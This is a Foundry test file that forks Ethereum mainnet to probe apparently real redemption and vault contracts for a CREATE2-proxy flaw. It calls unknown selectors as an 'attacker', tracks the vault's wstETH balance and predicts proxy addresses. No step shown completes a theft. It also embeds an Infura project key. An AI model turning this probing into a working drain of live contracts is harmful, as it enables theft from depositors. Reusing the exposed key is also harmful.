// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract Create2ProxyExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CompareR0R1() public view {
        console.log("=== COMPARING R0 AND R1 ===\n");

        console.log("R0 code size:", REDEMPTION_0.code.length);
        console.log("R1 code size:", REDEMPTION_1.code.length);

        bytes memory r0 = REDEMPTION_0.code;
        bytes memory r1 = REDEMPTION_1.code;

        uint r0call = 0; uint r0dc = 0; uint r0c2 = 0;
        for (uint i = 0; i < r0.length; i++) {
            if (uint8(r0[i]) == 0xf1) r0call++;
            if (uint8(r0[i]) == 0xf4) r0dc++;
            if (uint8(r0[i]) == 0xf5) r0c2++;
        }

        uint r1call = 0; uint r1dc = 0; uint r1c2 = 0;
        for (uint i = 0; i < r1.length; i++) {
            if (uint8(r1[i]) == 0xf1) r1call++;
            if (uint8(r1[i]) == 0xf4) r1dc++;
            if (uint8(r1[i]) == 0xf5) r1c2++;
        }

        console.log("\nR0 - CALL:", r0call);
        console.log("R0 - DELEGATECALL:", r0dc);
        console.log("R0 - CREATE2:", r0c2);
        console.log("\nR1 - CALL:", r1call);
        console.log("R1 - DELEGATECALL:", r1dc);
        console.log("R1 - CREATE2:", r1c2);
    }

    function test_TryR1Functions() public {
        console.log("=== TRYING R1 FUNCTIONS ===\n");

        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        console.log("Trying R1 redeem:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0xcff50c6e);
        sels[1] = bytes4(0x42dbe168);
        sels[2] = bytes4(0x252c50f3);
        sels[3] = bytes4(0x04824e70);
        sels[4] = bytes4(0x06e29712);

        console.log("\nTrying R1 selectors:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 1000e18)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultBefore) - int256(vaultAfter));
    }

    function test_InvestigateR1Proxy() public {
        console.log("=== INVESTIGATING R1 PROXY CREATION ===\n");

        vm.startPrank(attacker);

        console.log("Checking existing proxy:");

        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x778d364f), attacker)
        );
        if (s1 && d1.length >= 32) {
            address p = abi.decode(d1, (address));
            console.log("0x778d364f(attacker):", p);
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x51cbf345), attacker)
        );
        if (s2 && d2.length >= 32) {
            address p = abi.decode(d2, (address));
            console.log("0x51cbf345(attacker):", p);
        }

        vm.stopPrank();
    }

    function test_PredictAndDeployProxy() public {
        console.log("=== PREDICT AND DEPLOY PROXY ===\n");

        // The hint: "proxy attacker owns"
        // If R1 uses CREATE2 with CALLER-based salt,
        // attacker can predict the address and maybe deploy first

        bytes32 slot5 = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        address impl = address(uint160(uint256(slot5)));
        console.log("Implementation:", impl);

        // Minimal proxy init code pattern
        bytes memory proxyCode = abi.encodePacked(
            hex"3d602d80600a3d3981f3363d3d373d3d3d363d73",
            impl,
            hex"5af43d82803e903d91602b57fd5bf3"
        );

        bytes32 initCodeHash = keccak256(proxyCode);
        console.log("Init code hash:");
        console.logBytes32(initCodeHash);

        // Try different salt patterns
        console.log("\nPredicting addresses with different salts:");

        // Salt = keccak256(attacker)
        bytes32 salt1 = keccak256(abi.encode(attacker));
        address pred1 = computeCreate2(REDEMPTION_1, salt1, initCodeHash);
        console.log("Salt=keccak256(attacker):", pred1);
        console.log("  Has code:", pred1.code.length > 0);

        // Salt = attacker (address as bytes32)
        bytes32 salt2 = bytes32(uint256(uint160(attacker)));
        address pred2 = computeCreate2(REDEMPTION_1, salt2, initCodeHash);
        console.log("Salt=attacker:", pred2);
        console.log("  Has code:", pred2.code.length > 0);

        // Salt = keccak256(abi.encode(attacker, 0))
        bytes32 salt3 = keccak256(abi.encode(attacker, uint256(0)));
        address pred3 = computeCreate2(REDEMPTION_1, salt3, initCodeHash);
        console.log("Salt=keccak256(attacker,0):", pred3);
        console.log("  Has code:", pred3.code.length > 0);
    }

    function computeCreate2(address deployer, bytes32 salt, bytes32 initCodeHash) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            deployer,
            salt,
            initCodeHash
        )))));
    }

    function test_ExamineRCRedeem() public view {
        console.log("=== EXAMINING RC.REDEEM MECHANISM ===\n");

        // The vulnerability is in RC.redeem(amount, to)
        // "to" = CALLER (whoever calls it via REDEMPTION_0/1)

        // When finalizeRedeem is called:
        // 1. REDEMPTION_0 calls RC.redeem(amount, msg.sender)
        // 2. RC checks that msg.sender (REDEMPTION_0) is registered
        // 3. RC transfers wstETH from Vault to "to" (CALLER of finalizeRedeem)

        // The "action chaining" hint:
        // If there's a way to call finalizeRedeem through a proxy,
        // the assets would go to the proxy instead

        console.log("RC.redeem flow:");
        console.log("1. User calls REDEMPTION_0.finalizeRedeem(index)");
        console.log("2. REDEMPTION_0 calls RC.redeem(amount, msg.sender)");
        console.log("3. RC transfers wstETH to msg.sender");
        console.log("");
        console.log("Question: Can we inject a proxy in this flow?");
    }
}
